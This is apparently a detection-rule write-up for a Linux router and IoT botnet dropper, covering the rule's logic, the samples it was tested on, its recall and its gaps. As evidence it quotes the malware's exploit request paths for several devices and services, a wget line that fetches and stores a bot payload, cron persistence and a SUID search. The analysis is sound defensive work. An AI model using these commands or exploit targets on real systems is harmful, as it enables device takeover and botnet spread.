# zbot_static

Rule: `Linux_Botnet_Zbot_StaticDropper` (kind family, variant static_dropper, high). Related: `Linux_Botnet_Zbot_Rc4Stub` (see static_sk_bot.md).

## Evidence
11 files: 10 static-glibc images (ARM, MIPS BE/LE, AARCH64) and one zip container carrying the same ELF. Functions keep their names in Ghidra (`od_asus_infect`, `adb_infect`, `lol_priv_esc`, `evade_bg`, ...), so the code is a multi-exploit router/IoT spreader:

- Exploit templates (all 10/10): netgear `setup.cgi` syscmd, `/device.rsp?opt=user&list=`, `ftptest.cgi?loginuse`, `set_ftp.cgi`, `StatusAndSupportPingIPAddr` (`/data/statussupport_diagnostic_ping.cgi`), `connectivity_test&ip_addr=`, UPnP `WANIPConn1` SOAP, `DeviceUpgrade_1` on 37215, TR-069 `/UD/act?1` on 7547, F5 `/mgmt/tm/util/bash`, Spring Cloud Function `/functionRouter`, Redis `CONFIG SET dir /etc/cron.d`, `[od_realtek] udp 9034`.
- Payload chain: `wget http://%s/bot.$(uname -m) -O /tmp/.z` with `:8080` fallback, and a stage variant `stub.$m -> /tmp/.st`, `bot.$m.se -> /tmp/.se`, `bot.$m.sk -> /tmp/.sk`; `crontab` `*/5` re-launch of `/tmp/.z`; `cp /proc/self/exe`; `find / -perm -4000` SUID hunt (`lol_priv_esc`).
- "Not Mirai/Gafgyt by string content" holds.

## Rule and measurement
`3 of 7` exploit templates + `2 of 4` of the `.z/.se/.sk/WANIPConn1` markers. Recall 10/10 scannable members (the 11th is the zip). 0 hits in static_sk_bot, static_bot_started and the other ~400 files.

## Gaps
The zip container is not matched by the ELF rule. Newer versions with different template sets would drop below 3 of 7.
